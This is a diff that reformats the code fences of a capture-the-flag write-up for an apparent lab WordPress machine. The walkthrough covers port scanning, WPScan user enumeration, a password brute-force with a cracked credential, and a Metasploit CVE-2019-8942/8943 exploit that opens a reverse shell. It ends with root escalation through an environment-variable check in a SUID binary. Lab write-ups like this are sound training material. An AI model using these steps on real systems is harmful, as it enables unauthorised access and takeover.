@@ -5,7 +5,7 @@ Note: "Billy Joel made a Wordpress blog on his home computer and has started wor
 ----------------------------
  + Scan the ports and enumerate the available directories.
 
- '''bash
+ ```bash
 	$ nmap -sV -vv -A -T4 -p- <IP>
 	PORT    STATE SERVICE     REASON         VERSION
 	22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -27,10 +27,10 @@ Note: "Billy Joel made a Wordpress blog on his home computer and has started wor
 	|_/wp-admin/
 	139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 	445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
- '''
+ ```
  + We use tool "WPScan" to scan the page WordPress:
  + Link Git: "https://github.com/wpscanteam/wpscan?tab=readme-ov-file"
- '''bash
+ ```bash
 	$ wpscan --url=<IP> -e u
 	_______________________________________________________________
 	         __          _______   _____
@@ -83,20 +83,20 @@ Note: "Billy Joel made a Wordpress blog on his home computer and has started wor
 	[+] Billy Joel
 	 | Found By: Rss Generator (Aggressive Detection)
 
- '''
+ ```
 
  + We have 2 username can try to login /wp-admin: bjoel and kwheel
  + Try to brute force username with WPScan
- '''bash
+ ```bash
    $ wpscan --url=<IP> -U kwheel -P /usr/share/wordlists/rockyou.txt -t18
    ^[[31m[!]^[[0m Valid Combinations Found:
  	Username: kwheel, Password: cutiepie1
- '''
+ ```
 -> We have login /wp-admin with user kwheel
 + We have another info WordPress version 5.0
 + Search the vulnerable WordPress 5.0 and find it. This is CVE-2019-8943 and CVE-2019-8942 
 + We can use Metasploit to exploit it. Link: "https://www.exploit-db.com/exploits/46662"
-'''bash
+```bash
 	msf6 exploit(multi/http/wp_crop_rce) > exploit 
 
 	[*] Started reverse TCP handler on 10.11.101.46:4444 
@@ -118,32 +118,32 @@ Note: "Billy Joel made a Wordpress blog on his home computer and has started wor
 	id
 	uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
-'''
+```
 
 ###Privilege Escalation:
 + We can search file SUID to find some interesting files.
-'''bash
+```bash
 	find / -uid 0 -perm -4000 -type f 2>/dev/null
 	/usr/sbin/checker
-'''
+```
 -> /usr/sbin/checker is potential
 + Run it and we recivce the notification: "Not an Admin"
 + We can try to see library call of a given program /usr/sbin/checker
-'''bash
+```bash
 	$ ltrace /usr/sbin/checker
 	getenv("admin")                                  = nil
 	puts("Not an Admin")                             = 13
 	Not an Admin
 	+++ exited (status 0) +++
 
-'''
+```
 + Explain: 
     getenv("admin"): This function checks if an environmenst variable named "admin" is set. If it is, it returns the value of that variable. If not, it returns nil.
     = nil: This is the result of the getenv function call. In this case, it's nil, indicating that the "admin" environment variable is not set.
 
 + We can use IDA tool or Ghidra to see Pseudocode of program /usr/sbin/checker:
  IDA decomplier:
-'''bash
+```bash
 	int __fastcall main(int argc, const char **argv, const char **envp)
 	{
 	  if ( getenv("admin") )
@@ -158,22 +158,22 @@ Note: "Billy Joel made a Wordpress blog on his home computer and has started wor
 	  return 0;
       }
 
-''' 
+``` 
 + In this case environment variable "admin" is not set so we set the "admin". Use export to set
-'''bash
+```bash
 	export admin = admin
 	ltrace /usr/sbin/checker
 	getenv("admin")                                  = "admin"
 	setuid(0)                                        = -1
 	system("/bin/bash"
 
-''' 
+``` 
 
 + Run again and gain the root !!!
-'''bash
+```bash
 	/usr/sbin/checker
 	id
 	uid=0(root) gid=33(www-data) groups=33(www-data)
-'''
+```
 
 END!!!
